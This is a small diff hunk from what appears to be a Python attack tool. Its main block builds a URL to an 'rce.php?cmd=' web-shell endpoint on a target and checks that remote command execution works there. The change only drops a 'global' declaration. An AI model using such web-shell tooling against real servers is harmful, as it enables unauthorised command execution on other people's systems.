@@ -158,7 +158,6 @@ if __name__ == "__main__":
     url = sys.argv[1]
     if "?cmd=" not in url:
         url = url.rstrip("/") + "/rce.php?cmd=%s"
-    global RCE_URL
     RCE_URL = url
     advertise()
     if not rce_check():
